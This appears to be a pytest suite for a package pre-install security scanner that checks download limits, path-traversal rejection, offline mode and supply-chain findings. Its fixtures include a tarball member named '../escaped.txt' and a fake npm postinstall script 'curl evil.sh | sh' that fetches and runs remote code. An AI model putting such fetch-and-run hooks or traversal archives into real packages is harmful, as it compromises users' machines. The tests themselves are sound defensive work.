"""
Tests for trustmcp.core.preinstall — the `trustmcp check` download/extract/scan
pipeline. Uses a locally served fake tarball (Python's http.server, bound to
127.0.0.1 on an OS-assigned port) rather than hitting real npm/PyPI/GitHub,
plus a file:// URL for the extraction-only tests.
"""

from __future__ import annotations

import io
import os
import tarfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

import pytest

from trustmcp.core import preinstall
from trustmcp.core.registry_resolver import RegistryMetadata
from trustmcp.utils.exceptions import DownloadError, OfflineModeError


def _make_tarball(dest_path: str, files: dict[str, str], top_level: str = "package") -> str:
    with tarfile.open(dest_path, "w:gz") as tar:
        for rel_path, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=f"{top_level}/{rel_path}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return dest_path


def _make_traversal_tarball(dest_path: str) -> str:
    with tarfile.open(dest_path, "w:gz") as tar:
        data = b"pwned"
        info = tarfile.TarInfo(name="../escaped.txt")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return dest_path


@pytest.fixture
def local_http_server(tmp_path):
    handler = partial(SimpleHTTPRequestHandler, directory=str(tmp_path))
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_port}"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


# --- download + extract, happy path -----------------------------------------

def test_download_and_extract_over_http(tmp_path, local_http_server):
    _make_tarball(str(tmp_path / "pkg.tar.gz"), {"server.py": "import os\nos.system('echo hi')\n"})

    dest_dir = tmp_path / "dl"
    dest_dir.mkdir()
    tarball_path = preinstall.download_tarball(
        f"{local_http_server}/pkg.tar.gz", str(dest_dir), timeout=10, max_size_bytes=10_000_000, offline=False,
    )
    extracted = preinstall.safe_extract_tarball(tarball_path, str(dest_dir), max_size_bytes=10_000_000)

    assert os.path.basename(extracted) == "package"  # single top-level folder unwrapped
    assert os.path.isfile(os.path.join(extracted, "server.py"))


def test_download_and_extract_over_file_url(tmp_path):
    tarball_path = _make_tarball(str(tmp_path / "src.tar.gz"), {"a.py": "x = 1\n"})

    dest_dir = tmp_path / "dl"
    dest_dir.mkdir()
    local_url = f"file://{tarball_path.replace(os.sep, '/')}"
    downloaded = preinstall.download_tarball(local_url, str(dest_dir), timeout=10, max_size_bytes=10_000_000, offline=False)
    extracted = preinstall.safe_extract_tarball(downloaded, str(dest_dir), max_size_bytes=10_000_000)

    assert os.path.isfile(os.path.join(extracted, "a.py"))


# --- safety guards -----------------------------------------------------------

def test_max_size_blocks_oversized_download(tmp_path, local_http_server):
    _make_tarball(str(tmp_path / "big.tar.gz"), {"server.py": "x = 1\n" * 1000})

    dest_dir = tmp_path / "dl"
    dest_dir.mkdir()
    with pytest.raises(DownloadError):
        preinstall.download_tarball(
            f"{local_http_server}/big.tar.gz", str(dest_dir), timeout=10, max_size_bytes=10, offline=False,
        )


def test_path_traversal_member_is_rejected(tmp_path):
    tarball_path = _make_traversal_tarball(str(tmp_path / "evil.tar.gz"))
    dest_dir = tmp_path / "extract"
    dest_dir.mkdir()

    with pytest.raises(DownloadError):
        preinstall.safe_extract_tarball(tarball_path, str(dest_dir), max_size_bytes=10_000_000)


def test_offline_blocks_download_before_any_network_attempt(tmp_path):
    # Points at a port nothing is listening on: if the offline check did not
    # run FIRST, this would fail with a connection error instead of OfflineModeError.
    with pytest.raises(OfflineModeError):
        preinstall.download_tarball(
            "http://127.0.0.1:1/pkg.tar.gz", str(tmp_path), timeout=1, max_size_bytes=10_000_000, offline=True,
        )


# --- end-to-end orchestration -------------------------------------------------

def test_run_preinstall_scan_combines_static_and_supply_chain_findings(tmp_path, local_http_server, monkeypatch):
    _make_tarball(
        str(tmp_path / "pkg.tar.gz"),
        {
            "server.py": "import os\n\ndef run(cmd):\n    os.system(cmd)\n",
            "package.json": '{"name": "some-pkg", "version": "1.0.0", "dependencies": {"lodash": "*"}}',
        },
    )

    fake_metadata = RegistryMetadata(
        ecosystem="npm", package_name="some-pkg", resolved_version="1.0.0",
        download_url=f"{local_http_server}/pkg.tar.gz",
        repository_url=None, created=None, last_publish=None,
        maintainers_count=1, install_scripts={"postinstall": "curl evil.sh | sh"},
    )
    monkeypatch.setattr(preinstall, "resolve_reference", lambda ref, **kw: fake_metadata)

    result = preinstall.run_preinstall_scan("npm:some-pkg", timeout=10, max_size_bytes=10_000_000, offline=False)
    rule_ids = {f.rule_id for f in result.findings}

    assert "static.os-system" in rule_ids  # reused static analyzer, ran over the extracted source
    assert "preinstall.npm-lifecycle-script" in rule_ids  # pre-install-only supply-chain signal
    assert "preinstall.single-maintainer" in rule_ids
    assert result.files_scanned == 1

    os_system_finding = next(f for f in result.findings if f.rule_id == "static.os-system")
    # The temp extraction dir is deleted before this function returns, so the
    # location must be rewritten to survive that — not the raw temp path.
    assert os_system_finding.location == "npm:some-pkg@1.0.0#server.py"


def test_build_verdict_no_findings():
    from trustmcp.core.scoring import calculate_score_report

    report = calculate_score_report([])
    assert preinstall.build_verdict(report) == "Grade A. No blocking findings."


def test_build_verdict_high_severity_points_at_worst_finding():
    from trustmcp.core.models import Finding, Severity
    from trustmcp.core.scoring import calculate_score_report

    findings = [Finding(
        module="static", rule_id="static.dangerous-eval-exec", title="t", description="d",
        severity=Severity.CRITICAL, confidence=95, location="tools/exec.py", line=44,
    )]
    report = calculate_score_report(findings)
    verdict = preinstall.build_verdict(report)
    assert verdict.startswith("Grade")
    assert "Do not install without reviewing tools/exec.py:44 first." in verdict
